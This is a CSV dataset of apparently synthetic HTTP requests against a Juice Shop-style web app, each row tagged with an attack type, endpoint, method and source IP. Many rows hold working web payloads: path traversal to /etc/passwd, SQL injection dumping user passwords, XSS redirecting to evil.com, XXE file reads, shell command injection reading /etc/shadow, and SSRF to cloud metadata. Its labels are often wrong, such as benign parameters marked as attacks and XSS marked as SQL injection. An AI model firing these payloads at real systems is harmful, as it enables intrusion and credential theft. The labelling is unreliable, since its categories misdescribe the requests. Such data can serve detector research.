attack_type,payload,endpoint,http_method,request_body,source_ip
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.35
brute,sort=price,/#/search,POST,sort=price,192.168.1.238
rce,../../../../etc/passwd,/rest/admin/application-configuration,GET,../../../../etc/passwd,192.168.1.33
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.68
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.18
brute,product=1,/#/search,GET,product=1,192.168.1.219
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.29
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,GET,& ping -c 10 127.0.0.1 &,192.168.1.234
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,GET,<script>document.location='http://evil.com'</script>,192.168.1.123
brute,search=apple,/api/Products,POST,search=apple,192.168.1.232
lfi,sort=price,/ftp,GET,sort=price,192.168.1.70
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.237
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.99
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.228
brute,page=1,/rest/user/login,GET,page=1,192.168.1.94
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.25
xss,<script>document.location='http://evil.com'</script>,/#/search,GET,<script>document.location='http://evil.com'</script>,192.168.1.95
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.167
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.12
sqli,"' UNION SELECT username, password FROM Users--",/#/search,POST,"' UNION SELECT username, password FROM Users--",192.168.1.213
lfi,| ls -la /,/redirect,POST,| ls -la /,192.168.1.210
xss,<img src=x onerror=alert(1)>,/api/Products,POST,<img src=x onerror=alert(1)>,192.168.1.194
brute,search=apple,/rest/admin/application-configuration,GET,search=apple,192.168.1.136
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.66
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.102
lfi,page=1,/ftp,GET,page=1,192.168.1.91
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.140
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,GET,"' UNION SELECT username, password FROM Users--",192.168.1.252
lfi,email=user@test.com,/redirect,GET,email=user@test.com,192.168.1.207
rce,; cat /etc/shadow,/rest/user/login,GET,; cat /etc/shadow,192.168.1.243
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,POST,"' UNION SELECT username, password FROM Users--",192.168.1.104
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.243
lfi,product=1,/profile,GET,product=1,192.168.1.81
lfi,category=juice,/ftp,GET,category=juice,192.168.1.115
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.151
brute,page=1,/api/Products,POST,page=1,192.168.1.243
sqli,<script>document.location='http://evil.com'</script>,/rest/user/login,POST,<script>document.location='http://evil.com'</script>,192.168.1.51
lfi,sort=price,/profile,GET,sort=price,192.168.1.25
lfi,& ping -c 10 127.0.0.1 &,/profile,POST,& ping -c 10 127.0.0.1 &,192.168.1.124
brute,page=1,/rest/user/login,GET,page=1,192.168.1.220
lfi,search=apple,/ftp,GET,search=apple,192.168.1.76
lfi,search=apple,/ftp,GET,search=apple,192.168.1.211
xss,<img src=x onerror=alert(1)>,/profile,POST,<img src=x onerror=alert(1)>,192.168.1.247
lfi,..\..\..\windows\win.ini,/#/search,GET,..\..\..\windows\win.ini,192.168.1.52
lfi,page=1,/ftp,POST,page=1,192.168.1.221
brute,email=user@test.com,/#/search,POST,email=user@test.com,192.168.1.247
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.41
xss,& ping -c 10 127.0.0.1 &,/rest/basket,GET,& ping -c 10 127.0.0.1 &,192.168.1.106
xss,| ls -la /,/api/Products,POST,| ls -la /,192.168.1.215
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.138
lfi,page=1,/redirect,POST,page=1,192.168.1.13
lfi,../../../../etc/passwd,/rest/admin/application-configuration,POST,../../../../etc/passwd,192.168.1.242
lfi,| ls -la /,/redirect,GET,| ls -la /,192.168.1.175
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.18
brute,email=user@test.com,/rest/basket,POST,email=user@test.com,192.168.1.136
lfi,..\..\..\windows\win.ini,/rest/user/login,POST,..\..\..\windows\win.ini,192.168.1.213
brute,page=1,/#/search,GET,page=1,192.168.1.91
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.172
lfi,category=juice,/profile,POST,category=juice,192.168.1.55
lfi,product=1,/ftp,GET,product=1,192.168.1.158
lfi,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.4
sqli,' OR '1'='1' --,/api/Products,GET,' OR '1'='1' --,192.168.1.184
brute,category=juice,/api/Products,POST,category=juice,192.168.1.230
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.126
lfi,email=user@test.com,/redirect,GET,email=user@test.com,192.168.1.107
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.82
rce,| ls -la /,/rest/admin/application-configuration,POST,| ls -la /,192.168.1.75
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.20
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.66
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.123
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.89
lfi,..\..\..\windows\win.ini,/api/Products,POST,..\..\..\windows\win.ini,192.168.1.103
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.125
brute,product=1,/rest/basket,GET,product=1,192.168.1.130
brute,sort=price,/api/Products,GET,sort=price,192.168.1.236
brute,product=1,/rest/basket,POST,product=1,192.168.1.245
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.174
lfi,product=1,/redirect,POST,product=1,192.168.1.248
lfi,page=1,/profile,GET,page=1,192.168.1.110
lfi,sort=price,/redirect,GET,sort=price,192.168.1.116
rce,& ping -c 10 127.0.0.1 &,/rest/user/login,POST,& ping -c 10 127.0.0.1 &,192.168.1.86
rce,http://169.254.169.254/latest/meta-data/,/rest/user/login,POST,http://169.254.169.254/latest/meta-data/,192.168.1.221
brute,product=1,/#/search,POST,product=1,192.168.1.191
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.93
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.99
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.197
lfi,page=1,/profile,GET,page=1,192.168.1.49
xss,& ping -c 10 127.0.0.1 &,/#/search,GET,& ping -c 10 127.0.0.1 &,192.168.1.145
lfi,search=apple,/redirect,POST,search=apple,192.168.1.159
xss,<img src=x onerror=alert(1)>,/redirect,GET,<img src=x onerror=alert(1)>,192.168.1.3
brute,page=1,/#/search,POST,page=1,192.168.1.93
lfi,sort=price,/profile,GET,sort=price,192.168.1.254
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.251
lfi,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.39
lfi,..\..\..\windows\win.ini,/profile,GET,..\..\..\windows\win.ini,192.168.1.254
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.210
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.170
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.244
brute,page=1,/rest/admin/application-configuration,GET,page=1,192.168.1.181
lfi,& ping -c 10 127.0.0.1 &,/ftp,GET,& ping -c 10 127.0.0.1 &,192.168.1.65
brute,page=1,/#/search,GET,page=1,192.168.1.223
lfi,page=1,/redirect,GET,page=1,192.168.1.118
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.220
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.248
xss,<img src=x onerror=alert(1)>,/rest/user/login,POST,<img src=x onerror=alert(1)>,192.168.1.245
lfi,../../../../etc/passwd,/redirect,POST,../../../../etc/passwd,192.168.1.88
lfi,sort=price,/ftp,GET,sort=price,192.168.1.113
brute,page=1,/#/search,POST,page=1,192.168.1.69
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.9
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,POST,<img src=x onerror=alert(1)>,192.168.1.98
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.36
rce,| ls -la /,/rest/user/login,GET,| ls -la /,192.168.1.120
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.56
brute,page=1,/rest/user/login,POST,page=1,192.168.1.224
lfi,& ping -c 10 127.0.0.1 &,/redirect,GET,& ping -c 10 127.0.0.1 &,192.168.1.179
rce,| ls -la /,/rest/admin/application-configuration,GET,| ls -la /,192.168.1.219
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.212
sqli,"' UNION SELECT username, password FROM Users--",/api/Products,GET,"' UNION SELECT username, password FROM Users--",192.168.1.146
brute,search=apple,/#/search,POST,search=apple,192.168.1.226
brute,sort=price,/rest/admin/application-configuration,POST,sort=price,192.168.1.231
lfi,../../../../etc/passwd,/rest/basket,POST,../../../../etc/passwd,192.168.1.141
rce,http://169.254.169.254/latest/meta-data/,/#/search,POST,http://169.254.169.254/latest/meta-data/,192.168.1.13
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,POST,http://169.254.169.254/latest/meta-data/,192.168.1.60
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.116
xss,& ping -c 10 127.0.0.1 &,/#/search,GET,& ping -c 10 127.0.0.1 &,192.168.1.177
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.6
lfi,; cat /etc/shadow,/redirect,GET,; cat /etc/shadow,192.168.1.203
xss,; cat /etc/shadow,/rest/basket,GET,; cat /etc/shadow,192.168.1.24
brute,product=1,/rest/basket,GET,product=1,192.168.1.50
brute,product=1,/#/search,POST,product=1,192.168.1.140
brute,email=user@test.com,/api/Products,GET,email=user@test.com,192.168.1.71
xss,<script>document.location='http://evil.com'</script>,/ftp,GET,<script>document.location='http://evil.com'</script>,192.168.1.245
brute,product=1,/rest/user/login,POST,product=1,192.168.1.75
lfi,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.72
lfi,search=apple,/profile,POST,search=apple,192.168.1.80
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,POST,http://169.254.169.254/latest/meta-data/,192.168.1.174
xss,& ping -c 10 127.0.0.1 &,/api/Products,GET,& ping -c 10 127.0.0.1 &,192.168.1.8
brute,category=juice,/#/search,POST,category=juice,192.168.1.177
brute,page=1,/api/Products,POST,page=1,192.168.1.100
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.192
lfi,..\..\..\windows\win.ini,/#/search,POST,..\..\..\windows\win.ini,192.168.1.25
lfi,product=1,/profile,GET,product=1,192.168.1.86
lfi,category=juice,/ftp,POST,category=juice,192.168.1.219
brute,search=apple,/api/Products,POST,search=apple,192.168.1.205
brute,category=juice,/#/search,POST,category=juice,192.168.1.127
brute,category=juice,/api/Products,POST,category=juice,192.168.1.221
lfi,sort=price,/profile,POST,sort=price,192.168.1.239
brute,search=apple,/rest/user/login,GET,search=apple,192.168.1.207
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/ftp,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.19
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.22
lfi,..\..\..\windows\win.ini,/rest/user/login,POST,..\..\..\windows\win.ini,192.168.1.78
brute,category=juice,/rest/user/login,POST,category=juice,192.168.1.160
brute,page=1,/rest/basket,POST,page=1,192.168.1.131
brute,email=user@test.com,/rest/user/login,GET,email=user@test.com,192.168.1.141
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.246
lfi,product=1,/redirect,GET,product=1,192.168.1.202
xss,| ls -la /,/rest/basket,GET,| ls -la /,192.168.1.245
brute,page=1,/rest/basket,POST,page=1,192.168.1.172
brute,page=1,/api/Products,GET,page=1,192.168.1.77
brute,category=juice,/api/Products,GET,category=juice,192.168.1.160
lfi,sort=price,/redirect,POST,sort=price,192.168.1.121
lfi,../../../../etc/passwd,/profile,POST,../../../../etc/passwd,192.168.1.147
lfi,category=juice,/ftp,POST,category=juice,192.168.1.122
brute,page=1,/rest/basket,POST,page=1,192.168.1.42
brute,category=juice,/#/search,GET,category=juice,192.168.1.69
xss,<img src=x onerror=alert(1)>,/rest/basket,POST,<img src=x onerror=alert(1)>,192.168.1.60
brute,product=1,/#/search,POST,product=1,192.168.1.112
xss,& ping -c 10 127.0.0.1 &,/rest/basket,POST,& ping -c 10 127.0.0.1 &,192.168.1.56
xss,<script>document.location='http://evil.com'</script>,/#/search,GET,<script>document.location='http://evil.com'</script>,192.168.1.191
xss,<script>document.location='http://evil.com'</script>,/api/Products,GET,<script>document.location='http://evil.com'</script>,192.168.1.44
brute,product=1,/#/search,GET,product=1,192.168.1.10
lfi,sort=price,/redirect,POST,sort=price,192.168.1.78
brute,page=1,/#/search,GET,page=1,192.168.1.83
rce,http://169.254.169.254/latest/meta-data/,/#/search,GET,http://169.254.169.254/latest/meta-data/,192.168.1.243
sqli,' OR '1'='1' --,/profile,POST,' OR '1'='1' --,192.168.1.180
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,POST,& ping -c 10 127.0.0.1 &,192.168.1.230
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/#/search,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.243
xss,<script>document.location='http://evil.com'</script>,/profile,POST,<script>document.location='http://evil.com'</script>,192.168.1.127
lfi,http://169.254.169.254/latest/meta-data/,/ftp,POST,http://169.254.169.254/latest/meta-data/,192.168.1.88
xss,<script>document.location='http://evil.com'</script>,/#/search,POST,<script>document.location='http://evil.com'</script>,192.168.1.246
brute,page=1,/rest/admin/application-configuration,POST,page=1,192.168.1.143
lfi,../../../../etc/passwd,/profile,GET,../../../../etc/passwd,192.168.1.12
lfi,page=1,/profile,GET,page=1,192.168.1.94
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.130
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.194
brute,sort=price,/rest/user/login,GET,sort=price,192.168.1.144
lfi,http://169.254.169.254/latest/meta-data/,/ftp,GET,http://169.254.169.254/latest/meta-data/,192.168.1.107
brute,product=1,/api/Products,POST,product=1,192.168.1.46
brute,search=apple,/#/search,POST,search=apple,192.168.1.77
brute,product=1,/#/search,POST,product=1,192.168.1.183
lfi,product=1,/redirect,GET,product=1,192.168.1.96
lfi,../../../../etc/passwd,/#/search,GET,../../../../etc/passwd,192.168.1.159
lfi,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.25
brute,sort=price,/api/Products,POST,sort=price,192.168.1.34
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/basket,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.126
lfi,category=juice,/ftp,POST,category=juice,192.168.1.50
lfi,product=1,/profile,POST,product=1,192.168.1.116
brute,category=juice,/#/search,GET,category=juice,192.168.1.218
brute,product=1,/api/Products,GET,product=1,192.168.1.151
lfi,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.157
brute,product=1,/rest/basket,POST,product=1,192.168.1.182
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.77
lfi,category=juice,/profile,POST,category=juice,192.168.1.121
rce,http://169.254.169.254/latest/meta-data/,/rest/basket,POST,http://169.254.169.254/latest/meta-data/,192.168.1.93
rce,| ls -la /,/rest/user/login,GET,| ls -la /,192.168.1.13
lfi,sort=price,/profile,POST,sort=price,192.168.1.33
lfi,product=1,/redirect,GET,product=1,192.168.1.164
lfi,..\..\..\windows\win.ini,/rest/user/login,POST,..\..\..\windows\win.ini,192.168.1.121
lfi,..\..\..\windows\win.ini,/profile,POST,..\..\..\windows\win.ini,192.168.1.106
xss,<img src=x onerror=alert(1)>,/ftp,POST,<img src=x onerror=alert(1)>,192.168.1.15
brute,product=1,/rest/basket,GET,product=1,192.168.1.244
brute,search=apple,/rest/basket,POST,search=apple,192.168.1.93
brute,product=1,/rest/user/login,GET,product=1,192.168.1.239
lfi,product=1,/ftp,GET,product=1,192.168.1.230
brute,email=user@test.com,/rest/admin/application-configuration,GET,email=user@test.com,192.168.1.140
lfi,sort=price,/ftp,GET,sort=price,192.168.1.37
brute,category=juice,/api/Products,POST,category=juice,192.168.1.204
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.77
lfi,..\..\..\windows\win.ini,/redirect,GET,..\..\..\windows\win.ini,192.168.1.137
sqli,' OR '1'='1' --,/api/Products,GET,' OR '1'='1' --,192.168.1.189
xss,<img src=x onerror=alert(1)>,/#/search,GET,<img src=x onerror=alert(1)>,192.168.1.146
lfi,http://169.254.169.254/latest/meta-data/,/ftp,GET,http://169.254.169.254/latest/meta-data/,192.168.1.164
lfi,category=juice,/profile,GET,category=juice,192.168.1.216
lfi,..\..\..\windows\win.ini,/api/Products,POST,..\..\..\windows\win.ini,192.168.1.115
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.179
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.67
brute,category=juice,/rest/admin/application-configuration,POST,category=juice,192.168.1.72
sqli,' OR '1'='1' --,/profile,GET,' OR '1'='1' --,192.168.1.120
xss,| ls -la /,/#/search,GET,| ls -la /,192.168.1.197
lfi,search=apple,/ftp,POST,search=apple,192.168.1.53
lfi,sort=price,/ftp,POST,sort=price,192.168.1.61
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.214
brute,product=1,/#/search,POST,product=1,192.168.1.73
lfi,search=apple,/ftp,POST,search=apple,192.168.1.240
xss,& ping -c 10 127.0.0.1 &,/#/search,POST,& ping -c 10 127.0.0.1 &,192.168.1.94
brute,product=1,/rest/basket,POST,product=1,192.168.1.67
xss,<script>document.location='http://evil.com'</script>,/rest/basket,POST,<script>document.location='http://evil.com'</script>,192.168.1.245
lfi,& ping -c 10 127.0.0.1 &,/profile,POST,& ping -c 10 127.0.0.1 &,192.168.1.45
rce,http://169.254.169.254/latest/meta-data/,/api/Products,GET,http://169.254.169.254/latest/meta-data/,192.168.1.82
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.96
lfi,; cat /etc/shadow,/ftp,GET,; cat /etc/shadow,192.168.1.212
xss,<img src=x onerror=alert(1)>,/profile,GET,<img src=x onerror=alert(1)>,192.168.1.48
sqli,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/rest/user/login,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.182
lfi,category=juice,/redirect,POST,category=juice,192.168.1.102
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/api/Products,POST,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.235
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,GET,& ping -c 10 127.0.0.1 &,192.168.1.28
brute,category=juice,/rest/basket,POST,category=juice,192.168.1.106
brute,sort=price,/api/Products,POST,sort=price,192.168.1.204
xss,<img src=x onerror=alert(1)>,/redirect,POST,<img src=x onerror=alert(1)>,192.168.1.75
xss,& ping -c 10 127.0.0.1 &,/#/search,GET,& ping -c 10 127.0.0.1 &,192.168.1.237
brute,page=1,/rest/basket,GET,page=1,192.168.1.168
lfi,../../../../etc/passwd,/#/search,POST,../../../../etc/passwd,192.168.1.116
xss,<img src=x onerror=alert(1)>,/#/search,POST,<img src=x onerror=alert(1)>,192.168.1.128
xss,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",/profile,GET,"<?xml version=""1.0""?><!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><root>&xxe;</root>",192.168.1.64
rce,http://169.254.169.254/latest/meta-data/,/rest/admin/application-configuration,POST,http://169.254.169.254/latest/meta-data/,192.168.1.151
lfi,search=apple,/ftp,GET,search=apple,192.168.1.129
xss,<img src=x onerror=alert(1)>,/rest/admin/application-configuration,GET,<img src=x onerror=alert(1)>,192.168.1.184
brute,search=apple,/rest/basket,GET,search=apple,192.168.1.186
sqli,"' UNION SELECT username, password FROM Users--",/rest/basket,POST,"' UNION SELECT username, password FROM Users--",192.168.1.113
lfi,../../../../etc/passwd,/ftp,POST,../../../../etc/passwd,192.168.1.153
lfi,email=user@test.com,/ftp,GET,email=user@test.com,192.168.1.103
brute,category=juice,/api/Products,GET,category=juice,192.168.1.50
brute,category=juice,/api/Products,POST,category=juice,192.168.1.24
lfi,email=user@test.com,/profile,POST,email=user@test.com,192.168.1.248
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.222
brute,page=1,/rest/basket,POST,page=1,192.168.1.93
lfi,category=juice,/profile,POST,category=juice,192.168.1.201
lfi,../../../../etc/passwd,/ftp,GET,../../../../etc/passwd,192.168.1.82
brute,product=1,/rest/user/login,GET,product=1,192.168.1.201
lfi,search=apple,/redirect,POST,search=apple,192.168.1.9
rce,& ping -c 10 127.0.0.1 &,/rest/admin/application-configuration,GET,& ping -c 10 127.0.0.1 &,192.168.1.211
brute,category=juice,/#/search,POST,category=juice,192.168.1.136
sqli,"' UNION SELECT username, password FROM Users--",/redirect,POST,"' UNION SELECT username, password FROM Users--",192.168.1.46
lfi,product=1,/ftp,GET,product=1,192.168.1.26
lfi,sort=price,/redirect,POST,sort=price,192.168.1.70
lfi,..\..\..\windows\win.ini,/rest/basket,GET,..\..\..\windows\win.ini,192.168.1.37
lfi,page=1,/ftp,POST,page=1,192.168.1.219
brute,product=1,/#/search,POST,product=1,192.168.1.79
brute,search=apple,/api/Products,GET,search=apple,192.168.1.209
sqli,' OR '1'='1' --,/rest/user/login,GET,' OR '1'='1' --,192.168.1.95
brute,category=juice,/rest/basket,GET,category=juice,192.168.1.217
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.247
rce,http://169.254.169.254/latest/meta-data/,/#/search,POST,http://169.254.169.254/latest/meta-data/,192.168.1.210
lfi,& ping -c 10 127.0.0.1 &,/redirect,POST,& ping -c 10 127.0.0.1 &,192.168.1.31
lfi,sort=price,/profile,POST,sort=price,192.168.1.16
lfi,search=apple,/ftp,GET,search=apple,192.168.1.64
lfi,sort=price,/ftp,POST,sort=price,192.168.1.108
brute,sort=price,/rest/user/login,POST,sort=price,192.168.1.162
lfi,| ls -la /,/ftp,POST,| ls -la /,192.168.1.85
sqli,' OR '1'='1' --,/rest/admin/application-configuration,POST,' OR '1'='1' --,192.168.1.49
lfi,category=juice,/ftp,POST,category=juice,192.168.1.73
lfi,email=user@test.com,/redirect,POST,email=user@test.com,192.168.1.190
brute,product=1,/api/Products,POST,product=1,192.168.1.214
lfi,; cat /etc/shadow,/ftp,POST,; cat /etc/shadow,192.168.1.232
brute,search=apple,/#/search,GET,search=apple,192.168.1.26
brute,page=1,/rest/user/login,GET,page=1,192.168.1.70
brute,email=user@test.com,/rest/user/login,POST,email=user@test.com,192.168.1.5
brute,sort=price,/rest/basket,POST,sort=price,192.168.1.179
brute,product=1,/rest/basket,POST,product=1,192.168.1.2
brute,product=1,/rest/admin/application-configuration,POST,product=1,192.168.1.127
brute,email=user@test.com,/#/search,GET,email=user@test.com,192.168.1.179
brute,product=1,/api/Products,GET,product=1,192.168.1.117
brute,page=1,/rest/user/login,POST,page=1,192.168.1.117
lfi,email=user@test.com,/profile,GET,email=user@test.com,192.168.1.239
brute,product=1,/rest/user/login,GET,product=1,192.168.1.78
sqli,"' UNION SELECT username, password FROM Users--",/rest/user/login,GET,"' UNION SELECT username, password FROM Users--",192.168.1.58
lfi,search=apple,/redirect,GET,search=apple,192.168.1.105
lfi,sort=price,/profile,GET,sort=price,192.168.1.203
sqli,<script>document.location='http://evil.com'</script>,/rest/admin/application-configuration,GET,<script>document.location='http://evil.com'</script>,192.168.1.148
lfi,category=juice,/ftp,POST,category=juice,192.168.1.168
brute,page=1,/rest/user/login,GET,page=1,192.168.1.27
brute,sort=price,/rest/basket,GET,sort=price,192.168.1.47
lfi,product=1,/profile,POST,product=1,192.168.1.56
sqli,' OR '1'='1' --,/ftp,POST,' OR '1'='1' --,192.168.1.214
lfi,& ping -c 10 127.0.0.1 &,/ftp,POST,& ping -c 10 127.0.0.1 &,192.168.1.35
lfi,; cat /etc/shadow,/redirect,POST,; cat /etc/shadow,192.168.1.41
brute,sort=price,/rest/basket,POST,sort=price,192.168.1.96
lfi,category=juice,/profile,GET,category=juice,192.168.1.78
brute,category=juice,/rest/admin/application-configuration,GET,category=juice,192.168.1.14
xss,<img src=x onerror=alert(1)>,/api/Products,POST,<img src=x onerror=alert(1)>,192.168.1.99
lfi,product=1,/redirect,GET,product=1,192.168.1.201
brute,category=juice,/rest/user/login,GET,category=juice,192.168.1.4
rce,& ping -c 10 127.0.0.1 &,/rest/user/login,POST,& ping -c 10 127.0.0.1 &,192.168.1.32
brute,page=1,/#/search,POST,page=1,192.168.1.82
lfi,category=juice,/redirect,GET,category=juice,192.168.1.173
brute,product=1,/rest/admin/application-configuration,GET,product=1,192.168.1.206
